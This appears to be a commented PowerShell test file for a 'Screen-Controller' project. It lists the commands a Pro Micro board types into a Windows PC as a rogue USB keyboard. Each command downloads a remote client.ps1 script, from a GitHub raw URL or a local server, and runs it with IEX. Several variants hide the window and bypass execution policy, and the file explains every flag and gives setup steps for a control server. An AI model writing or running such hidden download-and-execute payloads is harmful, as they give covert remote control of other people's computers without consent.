# ================================================================
# TEST POWERSHELL COMMAND
# ================================================================
# This is the exact command that Pro Micro will type and execute
# Copy and run this in PowerShell to test if it works
# ================================================================

# ================================================================
# METHOD 1: GITHUB (RECOMMENDED - No web server needed!)
# ================================================================
# IMPORTANT: Must pass your IP as variable!
# FULL COMMAND (what Pro Micro types):
powershell -W Hidden -NoP -Exec Bypass -C "$c='192.168.8.158';$p=5555;IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/InoshMatheesha/Screen-Controller/refs/heads/main/client.ps1')"

# VISIBLE VERSION (for testing - shows window):
powershell -NoP -Exec Bypass -C "$c='192.168.8.158';$p=5555;IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/InoshMatheesha/Screen-Controller/refs/heads/main/client.ps1')"


# ================================================================
# METHOD 2: LOCAL WEB SERVER (if you don't want GitHub)
# ================================================================
powershell -W Hidden -NoP -Exec Bypass -C "IEX(New-Object Net.WebClient).DownloadString('http://192.168.8.158:8000/client.ps1')"


# ================================================================
# STEP-BY-STEP TEST:
# ================================================================

# 1. Start web server in Terminal 1:
python -m http.server 8000

# 2. Start control server in Terminal 2:
python server_professional.py

# 3. Run this command in Terminal 3 (on same PC for testing):
powershell -NoP -Exec Bypass -C "IEX(New-Object Net.WebClient).DownloadString('http://192.168.8.158:8000/client.ps1')"

# 4. Check server_professional.py GUI for connection


# ================================================================
# MANUAL TEST (type in Run dialog - Win+R):
# ================================================================
# Press: Win+R
# Type this:
powershell -W Hidden -NoP -C "IEX(New-Object Net.WebClient).DownloadString('http://192.168.8.158:8000/client.ps1')"
# Press: Enter


# ================================================================
# WHAT IT DOES:
# ================================================================
# powershell          → Opens PowerShell
# -W Hidden           → Window hidden (no visible window)
# -NoP                → No profile (faster startup)
# -Exec Bypass        → Bypass execution policy
# -C "..."            → Execute command
# IEX(...)            → Invoke-Expression (run downloaded code)
# New-Object Net.WebClient → Create web client
# .DownloadString(...) → Download client.ps1 as string
# http://192.168.8.158:8000/client.ps1 → Your server address


# ================================================================
# EVEN SHORTER VERSION (also works):
# ================================================================
powershell -W Hidden -C "IEX(iwr http://192.168.8.158:8000/client.ps1 -UseBasicParsing).Content"


# ================================================================
# ONE-LINER FOR TESTING (visible window):
# ================================================================
powershell -C "IEX(iwr http://192.168.8.158:8000/client.ps1 -UseBasicParsing).Content"
